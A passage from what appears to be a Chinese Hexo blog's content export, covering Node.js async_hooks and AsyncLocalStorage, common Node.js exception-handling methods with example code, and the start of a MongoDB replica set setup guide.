class="keyword">const</span> test = als.<span class="title function_">getStore</span>();</span><br><span class="line">   <span class="keyword">if</span> (test == <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   backlog.<span class="title function_">set</span>(asyncId, &#123; type, triggerAsyncId, resource &#125;);</span><br><span class="line">&#125;,</span><br><span class="line"> destroy (asyncId) &#123;</span><br><span class="line">   backlog.<span class="title function_">delete</span>(asyncId);</span><br><span class="line">&#125;,</span><br><span class="line"> promiseResolve (asyncId) &#123;</span><br><span class="line">   backlog.<span class="title function_">delete</span>(asyncId);</span><br><span class="line">&#125;</span><br><span class="line">&#125;).<span class="title function_">enable</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> queue = []</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">name, callback</span>) &#123;</span><br><span class="line"> queue.<span class="title function_">push</span>(&#123; name, callback &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run</span>(<span class="params"></span>) &#123;</span><br><span class="line"> <span class="keyword">if</span> (queue.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">const</span> &#123; name, callback &#125; = queue.<span class="title function_">pop</span>();</span><br><span class="line"> als.<span class="title function_">run</span>(name, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="keyword">await</span> <span class="title function_">callback</span>();</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">     als.<span class="title function_">exit</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">       <span class="title function_">setImmediate</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">         <span class="title function_">assert</span>(backlog.<span class="property">size</span> === <span class="number">0</span>, <span class="string">`&#x27;<span class="subst">$&#123;name&#125;</span>&#x27; ended with dangling async tasks.`</span>);</span><br><span class="line">         <span class="title function_">run</span>();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">process.<span class="title function_">nextTick</span>(run);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 测试声明开始 */</span></span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"> <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">setTimeout</span>(res, <span class="number">100</span>));</span><br><span class="line"> <span class="comment">// Pass.</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="title function_">test</span>(<span class="string">&#x27;bar&#x27;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"> <span class="built_in">setTimeout</span>(res, <span class="number">100</span>);</span><br><span class="line"> <span class="comment">// Assert Failed =&gt; &#x27;bar&#x27; ended with dangling async tasks.</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，每一次测试开始执行前，我们都会在为测试运行注册一个异步特有数据存储，然后再开始执行测试，这样在测试中发起的所有异步资源都会被 <code>async_hooks</code> 捕捉到并被测试模块标记，直到这个异步资源被销毁（或者是 Promise Resolve）。随后在测试结束后，我们再检查当前测试是否有遗留的异步资源，即可确认我们的测试是干净无残留的。</p><h3 id="异步调用栈-性能诊断"><a href="#异步调用栈-性能诊断" class="headerlink" title="异步调用栈/性能诊断"></a>异步调用栈/性能诊断</h3><p>这也是我们开头的问题。</p><p>在越来越多大型的项目使用 Node.js 作为研发技术栈后，开发者们也会越来越关注问题的诊断便捷性。除了异常错误排查，现在我们也可以通过 Chrome DevTools 的 CPU Profiler 亦或者是生成火焰图来诊断我们的 Node.js 应用性能表现，但是这些工具现在更多的是只能查看某一个函数在单个同步执行桢中的调用链路与时间占用比例，并没有能力将一个异步链路上每一个异步操作所花费的时间与百分比描绘出来。</p><p>而在能够串联异步链路中的异步调用栈之后，后续我们也可以在开发中使用更加直观的性能剖析工具：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/640.jpg" alt="640"></p><p>或者是提供线上的请求链路追踪能力，就如同现在各种成熟 APM 提供的应用间 RPC 调用链路一样，我们同样也可以绘制出应用内一个请求到底经历了什么流程，每一步分别花费了多少时间：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/640-20200925131314743.jpg" alt="640-20200925131314743"></p><h3 id="AsyncLocalStorage"><a href="#AsyncLocalStorage" class="headerlink" title="AsyncLocalStorage"></a>AsyncLocalStorage</h3><p>使用线程作为处理单元的模型中，我们可以使用 ThreadLocal 来存储对于当前线程特有的数据信息，那么在 Node.js 的异步模型中，我们有什么办法可以方便地存储对于当前异步任务来说特有的数据信息呢？</p><p>Node.js 在 3 月 4 日发行的 v13.10.0 版本第一次发布了 <code>async_hooks.AsyncLocalStorage</code>，可以在异步回调或者 <code>Promise</code> 中获取异步调用的状态信息，比如 HTTP 服务器在处理请求的异步链路中的任意一步都可以访问对于这个请求而言专有的数据。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>除了在 Node.js 中我们需要清晰的异步执行模型的定义之外，同样提供了 JavaScript 执行环境的浏览器中在 JavaScript 项目日渐复杂之后同样也需要更能描写异步时间线的诊断能力。除此之外，其实 Node.js 的 <code>async_hooks</code> 接口本身并不容易被更多的用户所使用，他暴露了异步资源非常底层的属性，虽然这些接口能够准确描述我们的异步资源，但是想要利用好这些接口并不简单。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Nodejs </category>
          
          <category> 异步延续模型 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Nodejs </tag>
            
            <tag> 异步延续模型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nodejs异常处理方式</title>
      <link href="/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F.htm"/>
      <url>/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F.htm</url>
      
        <content type="html"><![CDATA[<h1 id="在Node-js中常用的异常处理方式有哪些？"><a href="#在Node-js中常用的异常处理方式有哪些？" class="headerlink" title="在Node.js中常用的异常处理方式有哪些？"></a><strong>在Node.js中常用的异常处理方式有哪些？</strong></h1><h2 id="1-使用try-catch方式来处理异常"><a href="#1-使用try-catch方式来处理异常" class="headerlink" title="1.使用try catch方式来处理异常"></a>1.使用try catch方式来处理异常</h2><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  throw <span class="keyword">new</span> Error(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;异常被捕获了，我现在还可以继续执行了&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后执行命令行时候，可以看到如下，也会打印后面的 console.log的信息了；如下所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231525919-500969949.png" alt="561794-20190325231525919-500969949"></p><p>但是使用 try catch 无法处理异步代码块内出现的异常，比如如下代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    throw <span class="keyword">new</span> Error(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;异常被捕获了，我现在还可以继续执行了&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在命令行中打印信息如下：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231600301-1445960885.png" alt="561794-20190325231600301-1445960885"></p><p>可以看到，catch里面的console.log(‘’); 代码并没有被执行。说明catch里面的代码异常并没有被捕获到。</p><h2 id="2-使用event方式来处理异常"><a href="#2-使用event方式来处理异常" class="headerlink" title="2.使用event方式来处理异常"></a>2.使用event方式来处理异常</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> events = <span class="built_in">require</span>(<span class="string">&#x27;events&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个事件监听对象</span></span><br><span class="line"><span class="keyword">const</span> emitter = <span class="keyword">new</span> events.<span class="title class_">EventEmitter</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听error事件</span></span><br><span class="line">emitter.<span class="title function_">addListener</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 处理异常信息</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">11122222</span>); <span class="comment">// 能打印 1112222 说明异常捕获到了</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发 error事件</span></span><br><span class="line">emitter.<span class="title function_">emit</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;你代码出错了&#x27;</span>));</span><br></pre></td></tr></table></figure><p>执行效果如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231650303-1807839302.png" alt="561794-20190325231650303-1807839302"></p><p><strong>2.3 callback的方式</strong></p><p>比如读取一个文件，或者创建一个目录，测试代码如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">fs.<span class="title function_">mkdir</span>(<span class="string">&#x27;/dir&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;异常信息处理&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;创建目录成功&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后执行结果如下图所示：</p><p><img src="/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F/561794-20190325231727972-2095299768.png" alt="561794-20190325231727972-2095299768"></p><h2 id="3-Promise方式"><a href="#3-Promise方式" class="headerlink" title="3.Promise方式"></a><strong>3.Promise方式</strong></h2><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">(resolve, reject)</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;).<span class="keyword">then</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="regexp">//</span> 。。。。</span><br><span class="line">&#125;).<span class="keyword">catch</span>(<span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;能进来说明可以处理异常信息了&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行结果如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231800997-1387265798.png" alt="561794-20190325231800997-1387265798"></p><p>如上是处理同步代码，但是如果是异步代码呢？继续如下代码测试：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">(resolve, reject)</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;).<span class="keyword">then</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="regexp">//</span> 。。。。</span><br><span class="line">&#125;).<span class="keyword">catch</span>(<span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;能进来说明可以处理异常信息了&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后执行结果如下所示：</p><p><img src="/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F/561794-20190325231831471-2125390414.png" alt="561794-20190325231831471-2125390414"></p><p>可以看到，Promise也是一样无法捕获异步代码中的异常信息了。</p><h2 id="4-Async-Await-方式"><a href="#4-Async-Await-方式" class="headerlink" title="4.Async/Await 方式"></a><strong>4.Async/Await 方式</strong></h2><p>Async/Await 也是基于Promise的，Promise是无法捕获异步异常，因此Async/Await 也是没有办法捕获的。如下测试代码：</p><p>先看同步代码可以捕获到的，代码如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> testFunc = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">testAsync</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">testFunc</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;能进来，说明异常能处理&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">testAsync</span>();</span><br></pre></td></tr></table></figure><p>执行结果如下所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231912878-714948440.png" alt="561794-20190325231912878-714948440"></p><p>我们再看异步代码，如下所示：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> testFunc = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1111</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">testAsync</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">testFunc</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;能进来，说明异常能处理&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">testAsync</span>();</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231942744-382555430.png" alt="561794-20190325231942744-382555430"></p><h2 id="5-process方式-该方式既可以处理同步代码的异常，也可以处理异步代码的异常-。"><a href="#5-process方式-该方式既可以处理同步代码的异常，也可以处理异步代码的异常-。" class="headerlink" title="5.process方式(该方式既可以处理同步代码的异常，也可以处理异步代码的异常)。"></a><strong>5.process方式(该方式既可以处理同步代码的异常，也可以处理异步代码的异常)。</strong></h2><p>如下同步代码异常：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我能进来，说明可以处理异常&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">testFunc</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">testFunc</span>();</span><br></pre></td></tr></table></figure><p>执行结果如下所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232019749-1652359803.png" alt="561794-20190325232019749-1652359803"></p><p>异步代码如下所示：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">process.<span class="literal">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;我能进来，说明可以处理异常&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function testFunc() &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">testFunc();</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232050213-1983149986.png" alt="561794-20190325232050213-1983149986"></p><h2 id="6-domain方式"><a href="#6-domain方式" class="headerlink" title="6.domain方式"></a><strong>6.domain方式</strong></h2><p><strong>domain也可以处理任何类型异常的信息，包含同步和异步。</strong></p><p>如下同步代码所示：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">const domain = <span class="built_in">require</span>(<span class="string">&#x27;domain&#x27;</span>);</span><br><span class="line">const d = domain.create();</span><br><span class="line"></span><br><span class="line">d.<span class="literal">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;我能进来，说明能处理异常&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">d.run(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;同步代码处理&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232130654-246536331.png" alt="561794-20190325232130654-246536331"></p><p>异步代码如下所示：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">const domain = <span class="built_in">require</span>(<span class="string">&#x27;domain&#x27;</span>);</span><br><span class="line">const d = domain.create();</span><br><span class="line"></span><br><span class="line">d.<span class="literal">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;我能进来，说明能处理异常&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">d.run(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;异步代码处理&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232200670-1523570411.png" alt="561794-20190325232200670-1523570411"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Nodejs </category>
          
          <category> 异常处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Nodejs </tag>
            
            <tag> 异常处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB集群-副本集</title>
      <link href="/MongoDB%E9%9B%86%E7%BE%A4-%E5%89%AF%E6%9C%AC%E9%9B%86.htm"/>
      <url>/MongoDB%E9%9B%86%E7%BE%A4-%E5%89%AF%E6%9C%AC%E9%9B%86.htm</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB副本集"><a href="#MongoDB副本集" class="headerlink" title="MongoDB副本集"></a>MongoDB副本集</h1><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>MongoDB 副本集（Replica Set）是有自动故障恢复功能的主从集群，有一个Primary节点和一个或多个Secondary节点组成。类似于MySQL的MMM架构。更多关于副本集的介绍请见<a href="https://docs.mongodb.com/manual/replication/">官网</a>。</p><h3 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h3><p>副本集中数据同步过程：Primary节点写入数据，Secondary通过读取Primary的oplog得到复制信息，开始复制数据并且将复制信息写入到自己的oplog。如果某个操作失败，则备份节点停止从当前数据源复制数据。如果某个备份节点由于某些原因挂掉了，当重新启动后，就会自动从oplog的最后一个操作开始同步，同步完成后，将信息写入自己的oplog，由于复制操作是先复制数据，复制完成后再写入oplog，有可能相同的操作会同步两份，不过MongoDB在设计之初就考虑到这个问题，将oplog的同一个操作执行多次，与执行一次的效果是一样的。简单的说就是：</p><p>当Primary节点完成数据操作后，Secondary会做出一系列的动作保证数据的同步</p><ul><li>检查自己local库的oplog.rs集合找出最近的时间戳。</li><li>检查Primary节点local库oplog.rs集合，找出大于此时间戳的记录。</li><li>将找到的记录插入到自己的oplog.rs集合中，并执行这些操作。</li></ul><p>副本集的同步和主从同步一样，都是异步同步的过程，不同的是副本集有个自动故障转移的功能。其原理是：slave端从primary端获取日志，然后在自己身上完全顺序的执行日志所记录的各种操作（该日志是不记录查询操作的），这个日志就是local数据 库中的oplog.rs表，默认在64位机器上这个表是比较大的，占磁盘大小的5%，oplog.rs的大小可以在启动参数中设 定：–oplogSize 1000,单位是M。</p><blockquote><p>注意：在副本集的环境中，要是所有的Secondary都宕机了，只剩下Primary。最后Primary会变成Secondary，不能提供服务。</p></blockquote><h4 id="2-1自动切换"><a href="#2-1自动切换" class="headerlink" title="2.1自动切换"></a>2.1自动切换</h4><h5 id="集群开始如下："><a href="#集群开始如下：" class="headerlink" title="集群开始如下："></a>集群开始如下：</h5><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200730214916761.png" alt="image-20200730214916761"></p><h5 id="primary挂了以后"><a href="#primary挂了以后" class="headerlink" title="primary挂了以后:"></a>primary挂了以后:</h5><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200730215028695.png" alt="image-20200730215028695"></p><h3 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h3><h4 id="3-1环境准备"><a href="#3-1环境准备" class="headerlink" title="3.1环境准备"></a>3.1环境准备</h4><table><thead><tr><th>IP</th><th>主机名</th><th>系统</th><th>安装软件</th></tr></thead><tbody><tr><td>10.0.0.100</td><td>Server1</td><td>centos7</td><td>mongodb</td></tr><tr><td>10.0.0.101</td><td>Server2</td><td>centos7</td><td>mongodb</td></tr><tr><td>10.0.0.102</td><td>Server3</td><td>centos7</td><td>mongodb</td></tr></tbody></table><p>安装过程就忽略了。。。。</p><p>在每个服务器的mongodb配置文件加上：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//y</span>aml格式</span><br><span class="line">replication:</span><br><span class="line">  replSetName: repset</span><br><span class="line"><span class="regexp">//</span>如果是普通格式化</span><br><span class="line">replSet=anthony</span><br></pre></td></tr></table></figure><blockquote><p>mongod的配置文件，有yaml格式也有普通的=格式。</p><p>yaml格式的参考 <a href="https://docs.mongodb.com/manual/reference/configuration-options/#replication.replSetNam">https://docs.mongodb.com/manual/reference/configuration-options/#replication.replSetNam</a></p></blockquote><h3 id="4-初始化配置复制集"><a href="#4-初始化配置复制集" class="headerlink" title="4.初始化配置复制集"></a>4.初始化配置复制集</h3><h4 id="4-1-在主服务器创建复制集"><a href="#4-1-在主服务器创建复制集" class="headerlink" title="4.1 在主服务器创建复制集"></a>4.1 在主服务器创建复制集</h4><p>我们先配置包含两个节点的复制集，多出来的一个节点，会在接下来再做一个节点添加的操作</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mongo</span></span><br><span class="line"><span class="attribute">server</span>=&#123;<span class="string">&quot;_id&quot;</span>:<span class="string">&quot;anthony&quot;</span>,<span class="string">&quot;members&quot;</span>:[&#123;<span class="string">&quot;_id&quot;</span>:<span class="number">0</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;10.0.0.101:27017&quot;</span>&#125;,&#123;<span class="string">&quot;_id&quot;</span>:<span class="number">1</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;10.0.0.102:27017&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-初始化复制集"><a href="#4-2-初始化复制集" class="headerlink" title="4.2 初始化复制集"></a>4.2 初始化复制集</h4><p>在初始化复制集时，要确保从节点没有数据，不然在初始化以后会造成从节点服务器的数据丢失。</p><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">rs.initiate(<span class="keyword">server</span>)</span><br></pre></td></tr></table></figure><h4 id="4-3-查看复制集中各节点状态"><a href="#4-3-查看复制集中各节点状态" class="headerlink" title="4.3 查看复制集中各节点状态"></a>4.3 查看复制集中各节点状态</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">anthony:SECONDARY&gt; rs.status()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;set&quot;</span> : <span class="string">&quot;anthony&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span> : ISODate(<span class="string">&quot;2020-07-14T14:40:20.756Z&quot;</span>),</span><br><span class="line">         ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">    <span class="string">&quot;members&quot;</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.100:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,             <span class="regexp">//</span>健康值为<span class="number">1</span>，代表该节点处于运行良好状态</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">1</span>,               <span class="regexp">//</span><span class="number">1</span>代表主</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;PRIMARY&quot;</span>,   <span class="regexp">//</span>处于peimary状态</span><br><span class="line">         ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.101:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">2</span>,              <span class="regexp">//</span><span class="number">2</span>代表从</span><br><span class="line">            <span 